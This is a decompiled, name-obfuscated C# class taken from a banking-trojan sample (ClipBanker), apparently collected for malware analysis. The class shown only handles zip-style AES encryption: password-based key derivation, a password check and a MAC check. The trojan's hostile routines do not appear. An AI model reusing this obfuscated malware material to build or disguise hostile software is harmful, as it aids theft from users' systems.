// Decompiled with JetBrains decompiler
// Type: hyS.5N5
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0031Y3;
using \u0037q5;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace hyS
{
  internal sealed class \u0035N5
  {
    internal byte[] E45;
    internal byte[] \u0035kI;
    internal byte[] \u003196;
    internal int \u0031a5;
    private byte[] \u00332x;
    private byte[] m9C;
    private byte[] \u0036wj;
    private short dZ7;
    private short CT6;
    private int Q5a = 1000;
    private string f15;
    private bool H7O;
    public byte[] \u0036aM;

    private \u0035N5([In] string obj0, [In] int obj1)
    {
      this.f15 = obj0;
      this.\u0031a5 = obj1;
    }

    public static \u0035N5 F5L([In] string obj0, [In] int obj1)
    {
      \u0035N5 obj = new \u0035N5(obj0, obj1);
      int length = obj.\u0038T5() / 2;
      obj.E45 = new byte[length];
      new Random().NextBytes(obj.E45);
      return obj;
    }

    public static \u0035N5 ZhK([In] string obj0, [In] int obj1, [In] Stream obj2)
    {
      \u0035N5 obj = new \u0035N5(obj0, obj1);
      int length = obj.\u0038T5() / 2;
      obj.E45 = new byte[length];
      obj.\u0035kI = new byte[2];
      obj2.Read(obj.E45, 0, obj.E45.Length);
      obj2.Read(obj.\u0035kI, 0, obj.\u0035kI.Length);
      obj.dZ7 = (short) ((int) obj.\u0035kI[0] + (int) obj.\u0035kI[1] * 256);
      if (obj0 != null)
      {
        obj.CT6 = (short) ((int) obj.\u0039t3()[0] + (int) obj.\u0039t3()[1] * 256);
        if ((int) obj.CT6 != (int) obj.dZ7)
          throw new D2v("bad password");
      }
      return obj;
    }

    [SpecialName]
    public byte[] \u0039t3()
    {
      if (!this.H7O)
        this.SXl();
      return this.\u003196;
    }

    [SpecialName]
    public byte[] \u0036Mp() => this.E45;

    [SpecialName]
    private int \u0038T5() => this.\u0031a5 / 8;

    [SpecialName]
    public int \u0036B4() => this.\u0038T5() / 2 + 10 + 2;

    [SpecialName]
    public void OP1([In] string obj0)
    {
      this.f15 = obj0;
      if (this.f15 == null)
        return;
      this.CT6 = (short) ((int) this.\u0039t3()[0] + (int) this.\u0039t3()[1] * 256);
      if ((int) this.CT6 != (int) this.dZ7)
        throw new D2v();
    }

    private void SXl()
    {
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(this.f15, this.\u0036Mp(), this.Q5a);
      this.\u0036wj = rfc2898DeriveBytes.GetBytes(this.\u0038T5());
      this.\u00332x = rfc2898DeriveBytes.GetBytes(this.\u0038T5());
      this.\u003196 = rfc2898DeriveBytes.GetBytes(2);
      this.H7O = true;
    }

    [SpecialName]
    public byte[] \u00372B()
    {
      if (!this.H7O)
        this.SXl();
      return this.\u0036wj;
    }

    [SpecialName]
    public byte[] \u003941()
    {
      if (!this.H7O)
        this.SXl();
      return this.\u00332x;
    }

    public void \u00369l([In] Stream obj0)
    {
      bool flag = false;
      this.m9C = new byte[10];
      obj0.Read(this.m9C, 0, this.m9C.Length);
      if (this.m9C.Length != this.\u0036aM.Length)
        flag = true;
      if (!flag)
      {
        for (int index = 0; index < this.m9C.Length; ++index)
        {
          if ((int) this.m9C[index] != (int) this.\u0036aM[index])
            flag = true;
        }
      }
      if (flag)
        throw new UW5("The MAC does not match.");
    }
  }
}
